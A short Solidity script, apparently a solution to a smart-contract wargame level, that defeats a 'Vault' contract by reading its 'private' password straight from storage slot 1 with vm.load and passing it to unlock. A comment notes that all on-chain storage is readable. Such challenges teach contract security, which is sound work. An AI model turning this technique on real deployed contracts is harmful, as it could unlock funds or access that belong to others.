// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

contract VaultAttack is Broadcasted {
    function attack(address payable vaultCtr_) public payable override {
        IVault(vaultCtr_).unlock(vm.load(vaultCtr_, bytes32(uint256(1))));
    }
}

interface IVault {
    // ! read the private password from storage (everything is public in solidity)
    // bytes32 private password;
    function unlock(bytes32 _password) external;
}
